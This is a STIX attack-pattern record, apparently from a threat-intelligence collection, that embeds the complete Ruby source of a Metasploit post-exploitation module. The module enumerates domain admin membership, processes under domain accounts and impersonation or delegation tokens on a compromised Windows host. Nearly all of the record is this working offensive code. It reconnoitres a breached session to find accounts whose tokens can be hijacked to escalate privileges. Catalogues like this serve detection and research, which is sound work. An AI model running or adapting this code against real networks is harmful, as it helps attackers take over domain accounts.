{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f739ccae-2495-4387-a6c3-e0036c6390e2",
    "created": "2024-08-14T16:33:05.053293Z",
    "modified": "2024-08-14T16:33:05.053297Z",
    "name": "Windows Gather Enumerate Domain Tokens",
    "description": " This module enumerates domain account tokens, processes running under domain accounts, and domain users in the local Administrators, Users and Backup Operator groups.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_domain_tokens.rb",
            "external_id": "enum_domain_tokens.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Enumerate Domain Tokens',\n        'Description' => %q{\n          This module enumerates domain account tokens, processes running under\n          domain accounts, and domain users in the local Administrators, Users\n          and Backup Operator groups.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'win'],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              incognito_list_tokens\n              stdapi_sys_config_getuid\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n\n    domain = get_domain_name\n\n    fail_with(Failure::Unknown, 'Could not retrieve domain name. Is the host part of a domain?') unless domain\n\n    @domain_admins = get_members_from_group('Domain Admins', domain) || []\n\n    print_error(\"Could not retrieve '#{domain}\\\\Domain Admins' group members.\") if @domain_admins.blank?\n\n    netbios_domain_name = domain.split('.').first.upcase\n\n    uid = client.sys.config.getuid\n    if uid.starts_with?(netbios_domain_name)\n      user = uid.split('\\\\')[1]\n      print_good('Current session is running under a Domain Admin account') if @domain_admins.include?(user)\n    end\n\n    if domain_controller?\n      if is_system?\n        print_good('Current session is running as SYSTEM on a domain controller')\n      elsif is_admin?\n        print_good('Current session is running under a Local Admin account on a domain controller')\n      else\n        print_status('This host is a domain controller')\n      end\n    else\n      if is_system?\n        print_good('Current session is running as SYSTEM')\n      elsif is_admin?\n        print_good('Current session is running under a Local Admin account')\n      end\n      print_status('This host is not a domain controller')\n\n      list_group_members(netbios_domain_name)\n    end\n\n    list_processes(netbios_domain_name)\n    list_tokens(netbios_domain_name)\n  end\n\n  def list_group_members(domain)\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Account in Local Groups with Domain Context',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Local Group',\n        'Member',\n        'Domain Admin'\n      ]\n    )\n\n    print_status('Checking local groups for Domain Accounts and Groups')\n\n    [\n      'Administrators',\n      'Backup Operators',\n      'Users'\n    ].each do |group|\n      group_users = get_members_from_localgroup(group)\n\n      next unless group_users\n\n      vprint_status(\"Group '#{group}' members: #{group_users.join(', ')}\")\n\n      group_users.each do |group_user|\n        next unless group_user.include?(domain)\n\n        user = group_user.split('\\\\')[1]\n        tbl << [group, group_user, @domain_admins.include?(user)]\n      end\n    end\n\n    print_line(\"\\n#{tbl}\\n\")\n  end\n\n  def list_tokens(domain)\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Impersonation Tokens with Domain Context',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Token Type',\n        'Account Type',\n        'Account Name',\n        'Domain Admin'\n      ]\n    )\n    print_status('Checking for Domain group and user tokens')\n\n    user_tokens = client.incognito.incognito_list_tokens(0)\n    user_delegation = user_tokens['delegation'].split(\"\\n\")\n    user_impersonation = user_tokens['impersonation'].split(\"\\n\")\n\n    user_delegation.each do |dt|\n      next unless dt.include?(domain)\n\n      user = dt.split('\\\\')[1]\n      tbl << ['Delegation', 'User', dt, @domain_admins.include?(user)]\n    end\n\n    user_impersonation.each do |dt|\n      next if dt == 'No tokens available'\n      next unless dt.include?(domain)\n\n      user = dt.split('\\\\')[1]\n      tbl << ['Impersonation', 'User', dt, @domain_admins.include?(user)]\n    end\n\n    group_tokens = client.incognito.incognito_list_tokens(1)\n    group_delegation = group_tokens['delegation'].split(\"\\n\")\n    group_impersonation = group_tokens['impersonation'].split(\"\\n\")\n\n    group_delegation.each do |dt|\n      next unless dt.include?(domain)\n\n      user = dt.split('\\\\')[1]\n      tbl << ['Delegation', 'Group', dt, @domain_admins.include?(user)]\n    end\n\n    group_impersonation.each do |dt|\n      next if dt == 'No tokens available'\n      next unless dt.include?(domain)\n\n      user = dt.split('\\\\')[1]\n      tbl << ['Impersonation', 'Group', dt, @domain_admins.include?(user)]\n    end\n\n    if tbl.rows.empty?\n      print_status('No domain tokens available')\n      return\n    end\n\n    print_line(\"\\n#{tbl}\\n\")\n  end\n\n  def list_processes(domain)\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Processes under Domain Context',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Process Name',\n        'PID',\n        'Arch',\n        'User',\n        'Domain Admin'\n      ]\n    )\n    print_status('Checking for processes running under domain user')\n    client.sys.process.processes.each do |p|\n      next unless p['user'].include?(domain)\n\n      user = p['user'].split('\\\\')[1]\n      tbl << [\n        p['name'],\n        p['pid'],\n        p['arch'],\n        p['user'],\n        @domain_admins.include?(user)\n      ]\n    end\n\n    if tbl.rows.empty?\n      print_status('No processes running as domain users')\n      return\n    end\n\n    print_line(\"\\n#{tbl}\\n\")\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win']"
    ]
}